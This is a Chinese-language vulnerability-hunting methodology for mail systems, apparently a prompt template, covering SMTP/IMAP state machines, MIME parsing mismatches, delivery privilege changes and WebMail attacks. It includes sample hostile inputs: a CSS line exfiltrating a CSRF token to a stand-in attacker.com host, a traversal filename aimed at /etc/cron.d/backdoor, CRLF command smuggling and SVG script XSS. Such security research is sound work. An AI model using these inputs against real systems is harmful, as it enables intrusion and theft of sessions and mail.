---
description: 漏洞挖掘 - 邮件系统第一性原理深度挖掘
---

# 邮件系统漏洞挖掘 (Mail Vuln Hunter)

基于邮件系统的核心矛盾，深度追踪结构性脆弱点。

## 核心分析框架

### 原理一：协议状态机的不完备实现
**关键问题**：实现者是否完整覆盖了 RFC 定义的所有状态转换？未定义的转换路径上发生什么？

**追踪路径**：
- 绘制 SMTP/IMAP 状态机的完整转换图，对比 RFC 规范
- 在每个状态下尝试发送该状态不该接受的命令（如未 AUTH 就尝试 `MAIL FROM`）
- 检查 `STARTTLS` 握手期间的命令注入窗口（降级攻击 + 命令走私）
- 检查 `RSET` 命令是否真正清除了所有内部状态，还是遗留了部分会话上下文
- 验证：能否通过乱序命令序列，让会话进入"已认证但实际未认证"的幽灵状态？

### 原理二：MIME 解析的多层语义差异
**关键问题**：邮件投递链上的多个组件（MTA → MDA → MUA → WebMail 渲染）对同一 MIME 结构的解释是否一致？

**追踪路径**：
- 分析 Content-Type boundary 解析器对边界字符串的匹配策略（前缀匹配 vs 精确匹配 vs 正则）
- 检查嵌套 multipart 的递归深度限制（或无限制）
- 分析 Content-Transfer-Encoding 处理链：Base64 → Quoted-Printable → 原始字节，多次解码是否产生差异
- 检查 Content-Disposition filename 参数的路径穿越：`filename="../../../../etc/cron.d/backdoor"`
- 检查 charset 声明与实际编码不一致时的行为（UTF-7 XSS、ISO-2022-JP 注入）
- **核心方法**：构造一份邮件，使安全网关认为附件是 `text/plain`，但目标 MUA 将其解释为 `application/x-msdownload`
- 验证：安全层和渲染层对同一 MIME 结构的"看法"是否一致？

### 原理三：投递链的权限跃迁
**关键问题**：邮件从网络接收到写入用户磁盘的过程中，哪些环节发生了权限切换？切换点的输入是否可控？

**追踪路径**：
- 追踪邮件从 smtpd 进程（通常 nobody/postfix 权限）到 LDA/MDA（通常切换到目标用户权限）的完整链路
- 检查 Maildir 写入路径的构造逻辑——邮件 ID / 时间戳 / hostname 拼接是否存在注入点
- 分析 Sieve 过滤规则的执行上下文——用户定义的规则是否能触发文件写入到 Maildir 以外的路径
- 检查 `.forward` / `.procmailrc` 文件的解析——pipe 投递 (`|command`) 的命令注入
- 验证：能否通过精心构造的邮件信封（MAIL FROM/RCPT TO），影响 LDA 的文件写入路径或执行行为？

### 原理四：WebMail 的双重攻击面
**关键问题**：WebMail 前端既是邮件渲染器，又是 Web 应用。邮件内容能否突破渲染沙盒进入 Web 应用层？

**追踪路径**：
- 分析 HTML 邮件的清洗逻辑（sanitizer）——哪些标签/属性被允许，哪些被过滤
- 检查 CSS 注入可能性：`background: url(http://attacker.com/track?token=CSRF_TOKEN)` 数据外带
- 分析附件预览功能：PDF/Office 文件的服务器端渲染是否存在 SSRF
- 检查 IMAP `SEARCH` 命令的 LDAP/SQL 注入（Zimbra 历史漏洞模式）
- 分析日历邀请（iCal）的处理：`VALARM` trigger 能否执行动作？`ATTACH` URL 是否被获取？
- 验证：普通用户发送一封邮件，能否在管理员查看时窃取管理员 session？

## 高价值目标组件优先级

```
Pre-auth SMTP 协议解析 (最高价值 - 无需认证即可触达)
     ↓
MIME 解析器 (高价值 - 邮件内容完全由外部控制)
     ↓
WebMail HTML 渲染 (高价值 - XSS 可获取邮件内容和会话)
     ↓
Sieve/过滤规则引擎 (中高价值 - post-auth 但可能提权)
     ↓
IMAP 搜索/排序 (中价值 - 注入向量)
     ↓
管理接口 (中价值 - 通常需要管理员权限才可达)
```

## 已知高命中率的漏洞 Pattern

| Pattern | 检测方法 | 典型目标 |
|---------|---------|---------|
| SMTP 命令注入 via RCPT TO | 在收件人地址中注入 `\r\n` 后跟新命令 | Exim, Postfix |
| MIME boundary confusion | 构造多重 boundary 使安全网关与 MUA 解析不同附件 | 所有邮件系统 |
| Sieve pipe injection | 在 Sieve `redirect` 或 `fileinto` 参数中注入路径 | Dovecot + Pigeonhole |
| IMAP SEARCH 注入 | 在搜索关键词中注入 IMAP 协议命令 | Zimbra, Roundcube |
| WebMail XSS via SVG | 内嵌 SVG 附件包含 `<script>` 或事件处理器 | Roundcube, Zimbra |
| 附件名路径穿越 | Content-Disposition filename 含 `../` | 多数 WebMail 下载功能 |

## 输出格式

```
## 发现报告

### 原理映射
- 触发原理: [状态机不完备/MIME语义差异/权限跃迁/WebMail双面性]
- 断裂点: [哪个组件的哪个假设被违反]

### 脆弱路径
- 入口: [SMTP命令/邮件MIME结构/WebMail URL]
- 投递链追踪: [外部输入 → 解析/权限切换 → 最终影响]

### 验证思路
[如何构造最小触发邮件/命令序列]

### 危害本质
- 信任边界: [哪层隔离被突破]
- 状态影响: [能读取他人邮件？能执行命令？能提权？]
```
